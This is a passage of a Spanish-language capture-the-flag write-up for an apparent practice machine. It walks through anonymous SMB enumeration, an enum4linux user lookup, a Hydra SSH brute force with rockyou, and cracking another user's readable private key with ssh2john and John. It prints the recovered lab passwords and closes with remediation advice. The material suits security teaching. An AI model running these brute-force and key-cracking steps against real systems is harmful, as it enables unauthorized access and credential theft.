neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
</code></pre><h4>j.txt</h4><pre><code>For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K</code></pre><p>Estas notas ya dan una pista importante: las iniciales <strong>J</strong> y <strong>K</strong> probablemente corresponden a usuarios reales del sistema.</p>

---

## User brute-forcing to find the username & password

<h2>Usuario</h2><h3>SMBP</h3><p>revisando SMBP en modo anonymous</p><pre><code class="language-bash">└─$ smbclient -L //&lt;IP_TARGET&gt; -N

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server &lt;IP_TARGET&gt; (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available</code></pre><p>(La negociación SMB1 falla por incompatibilidad de protocolo con el servidor — no afecta la enumeración en Anonymous.)</p><p><strong>Buscando en el share Anonymous</strong></p><pre><code class="language-bash">smbclient //&lt;IP_TARGET&gt;/Anonymous -N 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Thu Apr 19 12:31:20 2018
  ..                                  D        0  Thu Apr 19 12:13:06 2018
  staff.txt                           N      173  Thu Apr 19 12:29:55 2018

                14282840 blocks of size 1024. 6245848 blocks available
smb: \&gt; get staff.txt 
getting file \staff.txt of size 173 as staff.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \&gt; ^C

</code></pre><pre><code class="language-bash">cat staff.txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay</code></pre><p>Esto confirma que las iniciales <strong>J</strong> y <strong>K</strong> encontradas en <code>/development</code> corresponden a los usuarios <strong>Jan</strong> y <strong>Kay</strong>. Se valida con <code>enum4linux</code>:</p><pre><code>enum4linux -a &lt;IP_TARGET&gt;
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''  
                                                                             
S-1-22-1-1000 Unix User\kay (Local User)                                     
S-1-22-1-1001 Unix User\jan (Local User)</code></pre><h3>SSH BRUTE FORCE</h3><p>Usando el usuario de jan</p><pre><code>hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://&lt;TARGET_IP&gt;

22][ssh] host: &lt;IP_TARGET&gt;   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
</code></pre>

---

## Obteniendo Flag

<h3>Falso positivos</h3><p>Durante la enumeración de privilegios con LinPEAS aparecieron varios posibles vectores de escalada, principalmente vulnerabilidades del kernel, <code>pkexec</code>, LXD y otros binarios SUID.</p><p>Sin embargo, al revisar cada caso manualmente, varios resultaron ser <strong>falsos positivos o no aplicables a la configuración del sistema</strong>. Por ejemplo, <code>jan</code> no pertenecía al grupo <code>lxd</code>, <code>sudo</code> no estaba permitido y la versión instalada de <code>policykit-1</code> ya contaba con el parche correspondiente a PwnKit.</p><p>Después de descartar estos vectores, continué con la enumeración de los directorios de otros usuarios.</p><h3><strong>Revisando el directorio de users:</strong></h3><pre><code>jan@ip-&lt;TARGET_IP&gt;:~$ cd ../
jan@ip-&lt;TARGET_IP&gt;:/home$ ls
jan  kay  ubuntu</code></pre><p>Encontramos el otro usuario</p><p><strong>Revisando el usuario de kay:</strong></p><pre><code>jan@ip-&lt;TARGET_IP&gt;:/home$ cd kay/
jan@ip-&lt;TARGET_IP&gt;/home/kay$ ls
pass.bak
jan@ip-&lt;TARGET_IP&gt;:/home/kay$ cat pass.bak 
cat: pass.bak: Permission denied
jan@ip-&lt;TARGET_IP&gt;:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Sep 28 15:27 ..
-rw------- 1 kay  kay   789 Jun 22  2025 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo</code></pre><p><code>pass.bak</code> no es accesible directamente, pero el directorio <code>.ssh</code> sí:</p><h3>Viendo el .ssh:</h3><pre><code>jan@ip-&lt;TARGET_IP&gt;:/home/kay$ cd .ssh/
jan@ip-&lt;TARGET_IP&gt;:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub</code></pre><h3>Crackeando id_rsa</h3><p>Se copia el contenido de <code>id_rsa</code> a la máquina atacante para su crackeo. Primero se convierte a un formato legible por John:</p><pre><code>└─$ python /usr/share/john/ssh2john.py id_rsa 
id_rsa: &lt;CONTENT_HASH&gt;</code></pre><p>crackeando la contraseña con john</p><pre><code>└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2026-09-28 22:08) 1.515g/s 125357p/s 125357c/s 125357C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. </code></pre><h3>Iniciando sesion con kay y obteniendo la flag</h3><pre><code>┌──(kali㉿Kali)-[~]
└─$ chmod 600 id_rsa 
                                                                             
┌──(kali㉿Kali)-[~]
└─$ ssh -i id_rsa kay@&lt;TARGET_IP&gt;
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 29 Sep 2026 12:21:39 AM EDT

  System load:  0.19               Processes:             117
  Usage of /:   50.6% of 13.62GB   Users logged in:       1
  Memory usage: 59%                IPv4 address for ens5: &lt;TARGET_IP&gt;
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sun Jun 22 13:40:04 2025 from &lt;TARGET_IP&gt;
kay@ip&lt;TARGET_IP&gt;:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$ 
</code></pre><p>Acceso obtenido como <code>kay</code>, flag y contraseña en texto plano recuperadas.</p>

---

## Resumen final

<h3>Impacto</h3><p>La cadena completa de compromiso no requirió ningún exploit de kernel ni vulnerabilidad compleja: bastó con configuración insegura por defecto (SMB anónimo permitiendo enumeración de usuarios) combinada con contraseñas débiles reutilizables por diccionario. En un entorno real, esto representa un vector de acceso inicial trivial para un atacante con herramientas básicas (<code>enum4linux</code>, <code>hydra</code>, <code>john</code>), y demuestra cómo un solo archivo de backup olvidado (<code>pass.bak</code>) puede escalar el compromiso de un usuario de bajo privilegio a acceso total sobre otra cuenta.</p><h3>Remediación</h3><ul><li><p>Deshabilitar o restringir el acceso anónimo a shares SMB.</p></li><li><p>Aplicar y hacer cumplir una política real de contraseñas (no solo comunicarla, como se ve en <code>j.txt</code>).</p></li><li><p>Eliminar o cifrar adecuadamente archivos de backup que contengan credenciales en texto plano.</p></li><li><p>Proteger llaves SSH privadas con passphrases robustas, fuera de diccionarios comunes como <code>rockyou.txt</code>.</p></li><li><p>Revisar periódicamente permisos de archivos sensibles en los directorios <code>home</code> de los usuarios.</p></li></ul><h3>Lecciones aprendidas</h3><ul><li><p>LinPEAS es un buen punto de partida, pero no todo lo que marca es explotable — validar manualmente cada vector (grupos, sudoers, versiones parcheadas) evita perder tiempo persiguiendo falsos positivos.</p></li><li><p>La enumeración de usuarios vía SMB/<code>enum4linux</code> puede ser tan valiosa como un escaneo de puertos: convertir "iniciales en un <code>.txt</code>" en usuarios reales fue la pieza clave para todo lo que siguió.</p></li><li><p>Revisar archivos aparentemente inofensivos en directorios de otros usuarios (<code>pass.bak</code>, historiales, configuraciones) suele ser más productivo que buscar exploits sofisticados.</p></li></ul><h3>Conclusión</h3><p>Esta máquina es una buena candidata para empezar en pentesting o para repasar fundamentos: cubre en un solo ejercicio casi todo el ciclo básico —reconocimiento, enumeración de servicios, pivoteo entre usuarios mediante información filtrada, y escalada de privilegios sin necesidad de exploits de kernel. Es especialmente útil para practicar la paciencia de leer pistas dispersas (nombres, iniciales, archivos de backup) y conectar puntos, una habilidad tan importante como el manejo técnico de las herramientas.</p>

